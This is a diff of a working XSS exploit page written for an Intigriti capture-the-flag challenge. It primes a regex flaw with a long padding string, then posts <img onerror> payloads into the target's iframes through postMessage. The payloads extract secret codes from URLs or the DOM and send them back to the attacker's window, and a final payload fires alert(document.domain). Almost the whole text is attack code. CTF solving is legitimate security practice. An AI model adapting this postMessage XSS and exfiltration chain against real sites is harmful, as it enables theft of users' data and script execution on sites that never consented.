@@ -4,10 +4,11 @@
     <title>Intigriti Exploit</title>
 </head>
 <body>
-    <h1>Challenge Solver</h1>
+    <h1>Challenge Solver (Fixed)</h1>
     <p>Click the button to start the exploit chain.</p>
     <button id="btn" style="font-size:20px; padding:15px;">Launch Exploit</button>
-    <div id="log"></div>
+    <h3>Log:</h3>
+    <pre id="log" style="background:#f0f0f0; padding:10px;"></pre>
 
     <script>
         let stolenStones = {};
@@ -16,92 +17,100 @@
         // 1. Listen for the stolen pieces coming back from the Stones
         window.addEventListener('message', (event) => {
             if (event.data.type === 'stone_collected') {
-                log(`Collected Stone ${event.data.index}: ${event.data.secret}`);
+                log(`[SUCCESS] Collected Stone ${event.data.index}: ${event.data.secret}`);
                 stolenStones[event.data.index] = event.data.secret;
                 checkAndSnap();
             }
         });
 
         document.getElementById('btn').addEventListener('click', () => {
-            // 2. Open the target (This bypasses "No Popups" because it's a click)
+            // Open the target in a new tab
             targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
-            log("Target opened... waiting for load...");
-
-            // 3. Wait for the target to load, then attack the Stones
+            log("Target opened... waiting 4 seconds for load...");
+            
+            // Wait for the target to fully load everything
             setTimeout(attackAllStones, 4000);
         });
 
         function attackAllStones() {
             log("Attacking Stones...");
-            // There are 6 stones (frames 0 to 5). We exploit all of them.
             for (let i = 0; i < 6; i++) {
                 sendExploit(i);
             }
         }
 
         function sendExploit(index) {
-            // TARGET THE IFRAME, NOT THE MAIN WINDOW
-            // We can access targetWin.frames[i] to postMessage to the sub-iframe
+            // Check if window is still open
+            if(!targetWin) { log("Target window lost!"); return; }
+            
             let targetFrame = targetWin.frames[index];
 
-            // STEP 1: The Primer (Trigger the Regex Bug)
-            // Sends 100 safe chars + 1 bad char (<)
-            const padding = "A".repeat(100);
+            // --- STEP 1: THE PRIMER ---
+            // HUGE PADDING FIX: We use 2000 characters to ensure 
+            // the regex 'lastIndex' jumps way past our actual payload length.
+            const padding = "A".repeat(2000); 
             targetFrame.postMessage(padding + "<", '*');
 
-            // STEP 2: The Payload (XSS)
-            // This JS executes INSIDE the Stone subdomain.
-            // It grabs the secret code part and sends it back to OUR exploit page (opener).
-            
-            // Note: Space Stone (Index 3) gets data differently, but let's try URL first for all.
-            // Most stones have code in ?stone_name=CODE
+            // --- STEP 2: THE PAYLOAD ---
+            // The script runs inside the iframe.
+            // FIX: We use 'window.top.opener' to talk back to this exploit page.
             const extractorScript = `
-                var codePart = "";
-                // Try URL first
-                var match = location.search.match(/=[a-f0-9]{8}/);
-                if(match) codePart = match[0].substring(1);
+                var secret = "";
                 
-                // Special case for Space Stone (if needed), might need body scrape
-                if(!codePart) codePart = document.body.innerText.substring(0,8); // Fallback guess
+                // Strategy A: URL (Works for most stones)
+                var match = location.search.match(/=[a-f0-9]{8}/);
+                if(match) secret = match[0].substring(1);
+                
+                // Strategy B: DOM Scan (Needed for Space Stone which has no URL param)
+                if(!secret) {
+                    // Look for any 8-char hex string in the body
+                    var bodyText = document.body.innerText || "";
+                    var hexMatch = bodyText.match(/[a-f0-9]{8}/);
+                    if(hexMatch) secret = hexMatch[0];
+                }
 
-                // Send back to attacker
-                window.opener.postMessage({type: 'stone_collected', index: ${index}, secret: codePart}, '*');
+                // Send back to the Exploit Page (window.top.opener)
+                if(window.top && window.top.opener) {
+                    window.top.opener.postMessage({type: 'stone_collected', index: ${index}, secret: secret}, '*');
+                }
             `;
 
+            // Wrap in image tag
             const payload = `<img src=x onerror="${extractorScript}">`;
             
-            // Send payload immediately after primer
+            // Send payload immediately
             targetFrame.postMessage(payload, '*');
         }
 
         function checkAndSnap() {
-            // Do we have all 6 pieces?
-            // The stones are loaded in this DOM order: 
-            // 0:Power, 1:Reality, 2:Soul, 3:Space, 4:Time, 5:Mind
-            // But the Code structure is: Power(0-8) + Mind(8-16) + Reality(16-24) + Space(24-32) + Soul(32-40) + Time(40-48)
-            
-            // Check if we have the specific indices we need
-            if (stolenStones[0] && stolenStones[5] && stolenStones[1] && stolenStones[3] && stolenStones[2] && stolenStones[4]) {
+            // Do we have all 6 pieces? (Indices 0-5)
+            // We check the length of keys in our object
+            if (Object.keys(stolenStones).length >= 6) {
                 
-                const p1 = stolenStones[0]; // Power
-                const p2 = stolenStones[5]; // Mind
-                const p3 = stolenStones[1]; // Reality
-                const p4 = stolenStones[3]; // Space
-                const p5 = stolenStones[2]; // Soul
-                const p6 = stolenStones[4]; // Time
+                // Reassemble Code based on correct order
+                // DOM Order: 0:Power, 1:Reality, 2:Soul, 3:Space, 4:Time, 5:Mind
+                // Code Order: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
+                
+                const fullCode = 
+                    stolenStones[0] + 
+                    stolenStones[5] + 
+                    stolenStones[1] + 
+                    stolenStones[3] + 
+                    stolenStones[2] + 
+                    stolenStones[4];
 
-                const fullCode = p1 + p2 + p3 + p4 + p5 + p6;
                 log("FULL CODE ASSEMBLED: " + fullCode);
 
-                // FINAL ATTACK: Use the code to trigger the alert on the Main Domain
-                // We use the Soul Stone (Index 2) to deliver the message to 'parent'
+                // --- FINAL ATTACK ---
+                // Send the command to the Main Page using one of the stones (Soul/Index 2)
                 const killPayload = `<img src=x onerror="parent.postMessage('${fullCode}' + 'alert(document.domain)', '*')">`;
                 
-                // Re-trigger regex on Stone 2
-                targetWin.frames[2].postMessage("A".repeat(100) + "<", '*');
+                // Reprime and Fire
+                const padding = "A".repeat(2000);
+                targetWin.frames[2].postMessage(padding + "<", '*');
                 targetWin.frames[2].postMessage(killPayload, '*');
                 
-                log("Final payload sent!");
+                log("Final payload sent! Check the other tab for the alert.");
             }
         }
 
